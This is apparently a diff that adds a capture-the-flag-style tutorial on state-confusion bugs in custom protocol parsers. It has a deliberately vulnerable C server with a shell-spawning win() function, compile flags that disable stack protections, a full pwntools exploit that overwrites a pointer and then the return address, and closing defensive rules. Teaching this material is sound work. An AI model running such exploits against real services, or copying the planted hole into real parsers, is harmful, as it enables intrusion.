@@ -1,1 +1,155 @@
+Protocol-parser based PWN involves targets that implement a custom state machine to interpret structural data streams (like network protocols, custom file formats, or serialization formats).
+These vulnerabilities occur when the parser loses track of its internal state, fails to validate fields in a dependent sequence, or mixes up data and control structures (such as length fields, type tags, and delimiters).
+
+1. The Custom Protocol Specification
+
+Imagine a custom binary protocol called TLB (Type-Length-Buffer) used by a server to manage user profiles. The packet structure looks like this:
+• Type (1 byte): 0x01 for Set Name, 0x02 for Set Bio, 0x03 for Save Profile.
+• Length (2 bytes): The size of the incoming data buffer.
+• Buffer (Variable): The actual payload data.
+
+2. The Vulnerable C Parser (protocol_server.c)
+
+This server implements the parser using a state machine loop. While it uses read() safely based on the length header, it fails to clear or re-validate internal pointer structures when changing states.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Spawning administrative shell...\n");
+    system("/bin/sh");
+}
+
+// Protocol States
+typedef enum {
+    STATE_READ_TYPE,
+    STATE_READ_LEN,
+    STATE_READ_DATA,
+    STATE_EXECUTE
+} parser_state_t;
+
+struct packet_parser {
+    unsigned char type;
+    unsigned short length;
+    char *data_ptr;          // Dynamic pointer to where the data should go
+    char inline_buffer[64];  // Static buffer for quick name changes
+};
+
+void parse_stream() {
+    struct packet_parser parser;
+    parser_state_t state = STATE_READ_TYPE;
+    
+    // Default data destination is the safe inline buffer
+    parser.data_ptr = parser.inline_buffer; 
+
+    while (1) {
+        if (state == STATE_READ_TYPE) {
+            if (read(0, &parser.type, 1) <= 0) break;
+            
+            // STATE CONFUSION BUG: Changing the type modifies data flags, 
+            // but if an unexpected type comes in later, data_ptr is never reset!
+            if (parser.type == 0x01) {
+                parser.data_ptr = parser.inline_buffer; // Safe local destination
+            }
+            state = STATE_READ_LEN;
+        }
+        else if (state == STATE_READ_LEN) {
+            if (read(0, &parser.length, 2) <= 0) break;
+            state = STATE_READ_DATA;
+        }
+        else if (state == STATE_READ_DATA) {
+            // VULNERABILITY: The parser trusts 'data_ptr'. If we previously sent a packet
+            // that overwrote data_ptr, or if we send a type that skips initialization,
+            // we can trigger an Arbitrary Write.
+            if (read(0, parser.data_ptr, parser.length) <= 0) break;
+            state = STATE_EXECUTE;
+        }
+        else if (state == STATE_EXECUTE) {
+            if (parser.type == 0x03) {
+                printf("[*] Saving profile state configurations.\n");
+                break; // Exit and return (triggers return address execution)
+            }
+            // Reset to read the next state packet in the stream sequence
+            state = STATE_READ_TYPE;
+        }
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    parse_stream();
+    return 0;
+}
+Use code with caution.
+
+Compilation Settings
+
+bash
+gcc -m32 -fno-stack-protector -no-pie protocol_server.c -o protocol_server
+Use code with caution.
+
+3. The Exploit Strategy (State Desynchronization)
+
+Because the parser loops sequentially through inputs without clearing old variables, we can perform a two-stage attack in a single continuous stream:
+1. Packet 1 (Setup an Overflow): Send Type: 0x01 (Set Name). Send a Length of 68 bytes (enough to fill inline_buffer and precisely reach the data_ptr variable right next to it). Overwrite data_ptr with the address of the Global Offset Table (GOT) or the Saved Return Address on the stack.
+2. Packet 2 (The Arbitrary Write): Send an invalid Type (e.g., 0x99). The parser fails to execute the initialization branch, meaning data_ptr retains our corrupted target address. The parser proceeds to read our second payload directly into our target location, overwriting it with the address of win().
+
+4. The Python Protocol Exploit (exploit_parser.py)
+
+Using pwntools, we package our binary payloads into structured protocol frames matching the strict Type-Length-Value format expected by the engine.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize binary target
+io = process('./protocol_server')
+
+# Address found via static analysis
+win_address = p32(0x080491b6)
+
+# Through debugging, we find that parsing data into inline_buffer takes 
+# exactly 64 bytes before overflowing into data_ptr itself.
+# We want data_ptr to point to the Return Address of parse_stream() on the stack.
+# Let's assume through debugging that target address is 0xffffd0c0.
+target_address = p32(0xffffd0c0)
+
+# ========================================================
+# PACKET 1: Overwrite data_ptr via an inline buffer overflow
+# ========================================================
+p1_type = b"\x01"                         # Type: Set Name
+p1_len  = p16(64 + 4)                     # Length: Fill buffer + overwrite pointer
+p1_data = b"A" * 64 + target_address      # Data: Overwrite data_ptr with stack address
+
+packet_1 = p1_type + p1_len + p1_data
+
+# ========================================================
+# PACKET 2: Trigger Arbitrary Write onto the pointing address
+# ========================================================
+p2_type = b"\x99"                         # Type: Invalid (Skips pointer pointer re-init)
+p2_len  = p16(4)                          # Length: 4 bytes to overwrite return address
+p2_data = win_address                     # Data: The payload target (win function)
+
+packet_2 = p2_type + p2_len + p2_data
+
+# ========================================================
+# PACKET 3: Execute and Return
+# ========================================================
+packet_3 = b"\x03" + p16(0)               # Type: Save Profile (Triggers loop break)
+
+# Send the continuous stream sequence to the protocol parser
+log.info("Sending multi-stage desynchronization stream...")
+io.send(packet_1 + packet_2 + packet_3)
+
+# Interact with the spawned shell
+io.interactive()
+Use code with caution.
+
+5. Architectural Defensive Rules for Protocol Parsers
+
+Securing structural network parsers requires moving away from loose variable tracking:
+• Zero-Out State Profiles Every Loop: Ensure that the absolute first step of a protocol processing cycle uses memset to clear out the target header metadata struct before filling it with fresh packet data.
+• Strict Type Whitelisting: Implement an explicit switch default case or else clause that handles unknown/malicious input types by instantly terminating the session and dropping connection states.
+• Isolate Processing Subsystems: Keep raw network parsing routines physically separate from active memory manipulation arrays to eliminate the possibility of an early processing loop corrupting the operational variables of a subsequent phase.
 
